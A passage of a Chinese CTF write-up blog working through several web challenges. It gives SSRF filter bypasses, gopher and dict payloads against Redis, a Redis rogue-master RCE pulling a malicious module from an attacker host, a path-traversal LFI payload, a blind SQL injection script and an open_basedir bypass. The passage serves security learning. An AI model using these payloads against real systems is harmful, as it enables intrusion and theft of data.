class="selector-tag">a</span><span class="selector-class">.com</span>:<span class="number">80</span></span><br><span class="line">libcurl解析结果：</span><br><span class="line">    schema: http</span><br><span class="line">    host: <span class="selector-tag">a</span>.com</span><br><span class="line">    user: u</span><br><span class="line">    pass: p</span><br><span class="line">    port: <span class="number">80</span></span><br><span class="line">    后面的@<span class="selector-tag">b</span>.com/会被忽略掉</span><br></pre></td></tr></table></figure>


<p><img src="https://img.npfs06.top/20210309224002.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p><img src="https://img.npfs06.top/20210309224148.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>首先对传入的url进行check_inner_ip检查是否为内网ip地址，这一部分限制了部分协议的使用，使用parse_url解析url，并使用gethostname、ip2long函数获取ip地址以及将ip地址转化为整数，要想返回为false，则不能使用内网ip发送请求。<br>通过检查则返回safe_request_url使用curl处理。</p>
<p>题目提示</p>
<blockquote>
<p>// Please visit hint.php locally.</p>
</blockquote>
<p>我们构造如下url传入</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http:<span class="comment">//0.0.0.0/hint.php</span></span><br></pre></td></tr></table></figure>
<p>0.0.0.0的IP地址表示整个网络，代表所有主机的ipv4地址，传入绕过</p>
<p>这里用ip进制转换右移进行比较，绕过方法还有：</p>
<p>1.<code>http://0x7f000001/hint.php</code></p>
<p>2.<code>http://@127.0.0.1./hint.php</code>(这种方法在比赛时可用，不过BUU不行)</p>
<h3 id="redis主从复制rce"><a href="#redis主从复制rce" class="headerlink" title="redis主从复制rce"></a>redis主从复制rce</h3><p>hint.php内容：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]===<span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">  file_put_contents(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>],<span class="string">&quot;&lt;?php echo &#x27;redispass is root&#x27;;exit();&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>得到redis密码为root<br><code>file_put_contents($_POST[&#39;file&#39;],&quot;&lt;?php echo &#39;redispass is root&#39;;exit();&quot;.$_POST[&#39;file&#39;]);</code>可以绕过写shell，不过试了下没有写权限。同理redis写shell也行不通了</p>
<p>尝试请求:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=dict://0x7f000001:6379/info</span><br></pre></td></tr></table></figure>
<p>返回的数据为：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">string(73) &quot;-NOAUTH Authentication required.</span><br><span class="line">-NOAUTH Authentication required.</span><br><span class="line">+OK</span><br><span class="line">&quot;</span><br></pre></td></tr></table></figure>
<p>说明需要认证，因为dict协议使用比较方便，可以直接在<code>/</code>后面跟上redis明文命令执行；可尝试使用dict协议进行认证：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=dict://0x7f000001:6379/auth+root</span><br></pre></td></tr></table></figure>
<p>返回的数据：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">string(44) &quot;-NOAUTH Authentication required.</span><br><span class="line">+OK</span><br><span class="line">+OK</span><br><span class="line">&quot;</span><br></pre></td></tr></table></figure>
<p>说明认证成功</p>
<p>但是dict只能执行一条redis命令，由于执行每个操作之前都要进行认证，那么就要用到可以一次执行多条命令的gopher协议</p>
<p><strong>使用gopher 探测信息</strong></p>
<p>空格二次编码后为<code>%2520</code>，换行符二次编码后为<code>%250a</code>；需要在每条命令后加上换行符</p>
<p>使用payload：</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=gopher:<span class="regexp">//</span><span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>:<span class="number">6379</span>/_AUTH%2520root%250ainfo%250aquit</span><br></pre></td></tr></table></figure>
<p>得到redis版本等信息：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Server</span></span><br><span class="line"><span class="attribute">redis_version</span>:<span class="number">5</span>.<span class="number">0</span>.<span class="number">3</span></span><br></pre></td></tr></table></figure>
<p>那么很显然是要用到<a target="_blank" rel="noopener" href="https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf">redis-post-exploitation</a>中提出的redis主从复制rce了</p>
<p>简单说下原理：</p>
<ul>
<li><code>slaveof</code>（新版改为<code>REPLICAOF</code>）建立后slave会向master发送<code>PSYNC</code>，请求开始复制</li>
<li>master可以返回<code>FULLRESYNC</code>，进行全量复制，然后将自己持久化的数据发给slave，正常情况下包括<code>Replication ID</code>, <code>offset</code>，master存储的key-value等等</li>
<li>slave会将这些数据保存到config中<code>dbfilename</code>指定的文件（默认为dump.rdb），然后再载入。</li>
<li>通过伪造master，可以控制发往slave的信息，从而做到无脏数据写文件</li>
<li>在Reids 4.x之后，Redis新增了模块功能，通过外部拓展，可以实现在redis中实现一个新的Redis命令，通过写c语言并编译出.so文件</li>
<li>因此通过FULLRESYNC写入恶意so文件，然后<code>MODULE LOAD /path/to/mymodule.so</code>载入模块即可rce</li>
</ul>
<p>做法</p>
<p>两篇需要的github地址</p>
<p><a target="_blank" rel="noopener" href="https://github.com/n0b0dyCN/redis-rogue-server">项目1</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/xmsec/redis-ssrf">项目2</a></p>
<p>把redis-rogue-server这个项目里的exp.so放在redis-ssrf-master这个项目下!，同时对<code>ssrf-redis</code>文件作如下三处修改</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//第一处 125行左右</span></span><br><span class="line">elif mode==<span class="number">3</span>:</span><br><span class="line">        lhost=<span class="string">&quot;vpn ip地址&quot;</span></span><br><span class="line">        lport=<span class="string">&quot;6666&quot;</span>            <span class="comment">//这里无需修改，应为要同rogue-server.py文件的端口相对应 </span></span><br><span class="line">        command=<span class="string">&quot;cat /flag&quot;</span>      <span class="comment">//需要执行的命令</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//第二处 140行左右</span></span><br><span class="line">	ip=<span class="string">&quot;0.0.0.0&quot;</span>   </span><br><span class="line">    port=<span class="string">&quot;6379&quot;</span></span><br></pre></td></tr></table></figure>


<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//第三处 160行左右</span></span><br><span class="line">	<span class="comment"># input auth passwd or leave blank for no pw</span></span><br><span class="line">    passwd = <span class="string">&#x27;root&#x27;</span> </span><br></pre></td></tr></table></figure>


<p><img src="https://img.npfs06.top/20210310000532.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>将得到的payload二次url编码传参，即可得到flag</p>
<p><img src="https://img.npfs06.top/20210310000022.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h2 id="网鼎杯-2020-半决赛-AliceWebsite"><a href="#网鼎杯-2020-半决赛-AliceWebsite" class="headerlink" title="[网鼎杯 2020 半决赛]AliceWebsite"></a>[网鼎杯 2020 半决赛]AliceWebsite</h2><p>源码下载下来，在index.php中有一个毫无过滤的本地文件包含</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="variable">$action</span> = (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>] : <span class="string">&#x27;home.php&#x27;</span>);</span><br><span class="line"> <span class="keyword">if</span> (file_exists(<span class="variable">$action</span>)) &#123;</span><br><span class="line">     <span class="keyword">include</span> <span class="variable">$action</span>;</span><br><span class="line"> &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&quot;File not found!&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>payload:</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action=..<span class="regexp">/../</span>..<span class="regexp">/../</span>../flag</span><br></pre></td></tr></table></figure>


<h2 id="De1CTF-2019-Giftbox"><a href="#De1CTF-2019-Giftbox" class="headerlink" title="[De1CTF 2019]Giftbox"></a>[De1CTF 2019]Giftbox</h2><p>打开是个很炫酷的页面，看样子是个 linux终端, 然后看一下有哪些命令可以调用</p>
<p><img src="https://img.npfs06.top/20210310230356.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>经过测试，发现在login处存在sql盲注</p>
<p><img src="https://img.npfs06.top/20210310221906.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>但是在写 exp 之前还需要来看看是怎么和服务器通讯的，通过查看数据流我们发现有个 totp参数，且再次提交之后这个 totp 又会发生改变</p>
<p><img src="https://img.npfs06.top/20210310231129.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p><strong>TOTP算法 (Time-based One-time Password algorithm)是一种从共享密钥和当前时间计算一次性密码的算法。</strong></p>
<p><strong>一些要求：</strong></p>
<p><strong>令牌与服务器之间必须时钟同步；</strong><br><strong>令牌与服务器之间必须共享密钥；</strong><br><strong>令牌与服务器之间必须使用相同的时间步长</strong><br><strong>核心算法：</strong><br><strong>TOTP =Truncate(HMAC-SHA-1(K, (T - T0) / X))</strong><br><strong>X 是时间间隔</strong></p>
<p>我们需要知道密钥</p>
<p><img src="https://img.npfs06.top/20210310231536.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p><img src="https://img.npfs06.top/20210310234243.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>所以重点就是<code>totp = pyotp.TOTP(&#39;GAXG24JTMZXGKZBU&#39;, 8, interval=5)</code>也就是长度为8，间隔为5</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> pyotp</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">totp = pyotp.TOTP(<span class="string">&quot;GAXG24JTMZXGKZBU&quot;</span>, <span class="number">8</span>, interval=<span class="number">5</span>)</span><br><span class="line">chars = <span class="string">&quot;!#$%&amp;()+,-./0123456789?ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz&#123;&#125;&quot;</span></span><br><span class="line">url = <span class="string">&quot;http://a664c97d-663f-494d-a65d-83d2891353c6.node3.buuoj.cn/shell.php?a=login%20admin&#x27;/**/and(&#123;&#125;)and/**/&#x27;1&#x27;=&#x27;1%201&amp;totp=&#123;&#125;&quot;</span></span><br><span class="line">payload = <span class="string">&quot;ascii(mid((select/**/group_concat(password)/**/from/**/users),&#123;&#125;,1))&gt;&#123;&#125;&quot;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">r =requests.Session()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10000</span>):</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">        <span class="comment">#print(url.format(payload.format(i,ord(char)), totp.now()))</span></span><br><span class="line">        res = r.get(url.<span class="built_in">format</span>(payload.<span class="built_in">format</span>(i,<span class="built_in">ord</span>(char)), totp.now()))</span><br><span class="line">        print(res.text)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;user&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            result += char</span><br><span class="line">            print(result)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        time.sleep(<span class="number">0.2</span>)</span><br></pre></td></tr></table></figure>


<p><img src="https://img.npfs06.top/20210310223205.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>得到密码：<code>hint&#123;G1ve_u_hi33en_C0mm3nd-sh0w_hiiintttt_23333&#125;</code></p>
<p>密码里提示有个隐藏命令 <code>sh0w_hiiintttt_23333</code> ，可以得到提示 <code>eval</code> 在 <code>launch</code> 的时候被调用。</p>
<p><img src="https://img.npfs06.top/20210310232716.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p><code>launch</code> 前需要先用 <code>targeting</code> 设置，不过对输入有限制，这里可以 <code>fuzz</code> 一下，得知 <code>code</code> 限制 <code>a-zA-Z0-9</code> ，position限制 <code>a-zA-Z0-9&#125;)$(&#123;_+-,.</code> ，而且两者的长度也有限制。</p>
<p>总结一下每个命令。</p>
<ul>
<li>targeting code position =&gt;储存一条 $code = “position”;</li>
<li>launch =&gt; 将上面 targeting 起来的 code 按照字典序跑一遍。</li>
<li>destuct =&gt; 清空，恢复初始状态</li>
</ul>
<p>这里需要用 <code>php可变变量</code> 构造和拼接 <code>payload</code> 。</p>
<p><img src="https://img.npfs06.top/20210310235106.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>外面包个 {}，里面的东西会被 执行 后拿返回值。变量后面加个 ()，就会尝试调用这个变量里存的名字所指向的函数。</p>
<p>首先读取phpinfo文件</p>
<p><img src="https://img.npfs06.top/20210311000258.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>保存，本地html格式打开，就可以看到可视化界面了</p>
<p><img src="https://img.npfs06.top/20210311000456.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>这里看到有 open_basedir，得想办法绕过 <code>open_basedir</code> 的限制，<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/4720">https://xz.aliyun.com/t/4720</a></p>
<p>绕过的 payload 如下。</p>
<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">chdir</span>(<span class="string">&#x27;img&#x27;</span>);<span class="selector-tag">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;..&#x27;</span>);<span class="selector-tag">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="selector-tag">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="selector-tag">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="selector-tag">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="selector-tag">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/&#x27;</span>);<span class="selector-tag">echo</span>(file_get_contents(<span class="string">&#x27;flag&#x27;</span>));</span><br></pre></td></tr></table></figure>
<p>参考网上师傅的脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> pyotp</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://a664c97d-663f-494d-a65d-83d2891353c6.node3.buuoj.cn/shell.php?a=%s&amp;totp=%s&#x27;</span></span><br><span class="line">totp = pyotp.TOTP(<span class="string">&quot;GAXG24JTMZXGKZBU&quot;</span>, digits=<span class="number">8</span>, interval=<span class="number">5</span>)</span><br><span class="line">s = requests.session()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>(<span class="params">password</span>):</span></span><br><span class="line">    username = <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">    payload = <span class="string">&#x27;login %s %s&#x27;</span> % (username, password)</span><br><span class="line">    payload = urllib.parse.quote(payload)</span><br><span class="line">    payload = url % (payload, totp.now())</span><br><span class="line">    s.get(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">destruct</span>():</span></span><br><span class="line">    payload = <span class="string">&#x27;destruct&#x27;</span></span><br><span class="line">    payload = urllib.parse.quote(payload)</span><br><span class="line">    payload = url % (payload, totp.now())</span><br><span class="line">    s.get(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">targeting</span>(<span class="params">code, position</span>):</span></span><br><span class="line">    payload = <span class="string">&#x27;targeting %s %s&#x27;</span> % (code, position)</span><br><span class="line">    payload = urllib.parse.quote(payload)</span><br><span class="line">    payload = url % (payload, totp.now())</span><br><span class="line">    s.get(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">launch</span>():</span></span><br><span class="line">    payload = <span class="string">&#x27;launch&#x27;</span></span><br><span class="line">    payload = urllib.parse.quote(payload)</span><br><span class="line">    payload = url % (payload, totp.now())</span><br><span class="line">    <span class="keyword">return</span> s.get(payload).text</span><br><span class="line"></span><br><span class="line">login(<span class="string">&#x27;hint&#123;G1ve_u_hi33en_C0mm3nd-sh0w_hiiintttt_23333&#125;&#x27;</span>)</span><br><span class="line">destruct()</span><br><span class="line">targeting(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;chr&#x27;</span>)</span><br><span class="line">targeting(<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;&#123;$a(46)&#125;&#x27;</span>)</span><br><span class="line">targeting(<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;&#123;$b&#125;&#123;$b&#125;&#x27;</span>)</span><br><span class="line">targeting(<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;&#123;$a(47)&#125;&#x27;</span>)</span><br><span class="line">targeting(<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;js&#x27;</span>)</span><br><span class="line">targeting(<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;open_basedir&#x27;</span>)</span><br><span class="line">targeting(<span class="string">&#x27;g&#x27;</span>,<span class="string">&#x27;chdir&#x27;</span>)</span><br><span class="line">targeting(<span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;ini_set&#x27;</span>)</span><br><span class="line">targeting(<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;file_get_&#x27;</span>)</span><br><span class="line">targeting(<span class="string">&#x27;j&#x27;</span>,<span class="string">&#x27;&#123;$i&#125;contents&#x27;</span>)</span><br><span class="line">targeting(<span class="string">&#x27;k&#x27;</span>,<span class="string">&#x27;&#123;$g($e)&#125;&#x27;</span>)</span><br><span class="line">targeting(<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;&#123;$h($f,$c)&#125;&#x27;</span>)</span><br><span class="line">targeting(<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;&#123;$g($c)&#125;&#x27;</span>)</span><br><span class="line">targeting(<span class="string">&#x27;n&#x27;</span>,<span class="string">&#x27;&#123;$h($f,$d)&#125;&#x27;</span>)</span><br><span class="line">targeting(<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;&#123;$d&#125;flag&#x27;</span>)</span><br><span class="line">targeting(<span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;&#123;$j($o)&#125;&#x27;</span>)</span><br><span class="line">targeting(<span class="string">&#x27;q&#x27;</span>,<span class="string">&#x27;printf&#x27;</span>)</span><br><span class="line">targeting(<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;&#123;$q($p)&#125;&#x27;</span>)</span><br><span class="line">print(launch())</span><br></pre></td></tr></table></figure>


<h2 id="HarekazeCTF2019-Sqlite-Voting"><a href="#HarekazeCTF2019-Sqlite-Voting" class="headerlink" title="[HarekazeCTF2019]Sqlite Voting"></a>[HarekazeCTF2019]Sqlite Voting</h2><p>题目还给了一段sql语句，可知flag在flag表里</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> IF <span class="keyword">EXISTS</span> `vote`;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> `vote` (</span><br><span class="line">  `id` <span class="type">INTEGER</span> <span class="keyword">PRIMARY</span> KEY AUTOINCREMENT,</span><br><span class="line">  `name` TEXT <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `count` <span class="type">INTEGER</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `vote` (`name`, `count`) <span class="keyword">VALUES</span></span><br><span class="line">  (<span class="string">&#x27;dog&#x27;</span>, <span class="number">0</span>),</span><br><span class="line">  (<span class="string">&#x27;cat&#x27;</span>, <span class="number">0</span>),</span><br><span class="line">  (<span class="string">&#x27;zebra&#x27;</span>, <span class="number">0</span>),</span><br><span class="line">  (<span class="string">&#x27;koala&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> IF <span class="keyword">EXISTS</span> `flag`;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> `flag` (</span><br><span class="line">  `flag` TEXT <span class="keyword">NOT</span> <span class="keyword">NULL</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `flag` <span class="keyword">VALUES</span> (<span class="string">&#x27;HarekazeCTF&#123;&lt;redacted&gt;&#125;&#x27;</span>);</span><br></pre></td></tr></table></figure>




<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//vote.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">  show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">  <span class="variable">$banword</span> = [</span><br><span class="line">    <span class="comment">// dangerous chars</span></span><br><span class="line">    <span class="comment">// &quot; % &#x27; * + / &lt; = &gt; \ _ ` ~ -</span></span><br><span class="line">    <span class="string">&quot;[\&quot;%&#x27;*+\\/&lt;=&gt;\\\\_`~-]&quot;</span>,</span><br><span class="line">    <span class="comment">// whitespace chars</span></span><br><span class="line">    <span class="string">&#x27;\s&#x27;</span>,</span><br><span class="line">    <span class="comment">// dangerous functions</span></span><br><span class="line">    <span class="string">&#x27;blob&#x27;</span>, <span class="string">&#x27;load_extension&#x27;</span>, <span class="string">&#x27;char&#x27;</span>, <span class="string">&#x27;unicode&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;(in|sub)str&#x27;</span>, <span class="string">&#x27;[lr]trim&#x27;</span>, <span class="string">&#x27;like&#x27;</span>, <span 